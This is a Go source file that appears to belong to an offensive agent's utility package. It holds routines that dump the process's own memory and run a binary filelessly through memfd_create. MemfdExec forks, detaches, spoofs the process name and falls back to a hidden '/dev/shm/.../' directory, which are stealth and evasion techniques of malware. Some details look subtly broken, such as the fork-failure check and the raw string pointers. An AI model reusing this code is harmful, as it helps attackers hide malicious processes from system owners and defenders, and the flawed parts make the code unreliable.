//go:build linux
// +build linux

package util

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// DumpSelfMem dump everything (readable) from self process
// will dump libraries as well, if any
// Linux only
func crossPlatformDumpSelfMem() (memdata [][]byte, err error) {
	maps_file := fmt.Sprintf("/proc/%d/maps", os.Getpid())
	mem_file := fmt.Sprintf("/proc/%d/mem", os.Getpid())

	// open memory
	mem, err := os.Open(mem_file)
	defer mem.Close()
	if err != nil {
		return nil, fmt.Errorf("open %s: %v", mem_file, err)
	}

	// parse maps
	maps, err := os.Open(maps_file)
	if err != nil {
		return
	}
	scanner := bufio.NewScanner(maps)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		lineSplit := strings.Fields(line)
		if len(lineSplit) == 1 {
			log.Printf("%s: failed to parse", line)
			continue
		}
		if !strings.HasPrefix(lineSplit[1], "r") {
			// if not readable
			log.Printf("%s: not readable", line)
			continue
		}

		// parse map line
		start_end := strings.Split(lineSplit[0], "-")
		if len(start_end) == 1 {
			log.Printf("%s: failed to parse", line)
			continue
		}
		start, err := strconv.ParseInt(start_end[0], 16, 64)
		if err != nil {
			log.Printf("%s: failed to parse start", line)
		}
		end, err := strconv.ParseInt(start_end[1], 16, 64)
		if err != nil {
			log.Printf("%s: failed to parse end", line)
		}

		// seek from memory
		read_size := end - start
		read_buf := make([]byte, read_size)
		n, _ := mem.ReadAt(read_buf, start)
		if n <= 0 {
			log.Printf("%s: nothing read", line)
			continue
		}
		memdata = append(memdata, read_buf)
	}

	return
}

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	fork           = 57
)

// MemFDWrite create a memfd and write data to it
// returns the fd
func MemFDWrite(data []byte) int {
	mem_name := ""
	fd, _, errno := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&mem_name)), uintptr(0), 0)
	if errno < 0 {
		log.Printf("MemFDWrite: %v", errno)
		return -1
	}
	_, err := syscall.Write(int(fd), data)
	if err != nil {
		log.Printf("MemFDWrite: %v", err)
		return -1
	}
	return int(fd)
}

func MemfdExec(procName string, env []string, buffer []byte) (pid int) {
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		log.Print("fork failed")
		return
	default:
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	err := syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	if err != nil {
		log.Print(err)
		return
	}
	file.Close()

	progWithArgs := append([]string{procName}, os.Args[1:]...)
	err = syscall.Exec(fdPath, progWithArgs, env)
	if err == nil {
		log.Println("agent started from memory using memfd_create")
		return
	}

	// older kernel
	log.Printf("memfd_create failed: %v, trying shm_open", err)
	shmPath := "/dev/shm/.../"
	if _, err := os.Stat(shmPath); os.IsNotExist(err) {
		err = os.Mkdir(shmPath, 0700)
		if err != nil {
			log.Print(err)
			return
		}
	}
	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
	if err != nil {
		log.Print(err)
		return
	}
	err = os.Chdir(shmPath)
	if err != nil {
		log.Print(err)
		return
	}
	cmd := exec.Command(procName, os.Args[1:]...)
	cmd.Env = env
	err = cmd.Start()
	if err != nil {
		log.Print(err)
		return
	}
	pid = cmd.Process.Pid

	return
}
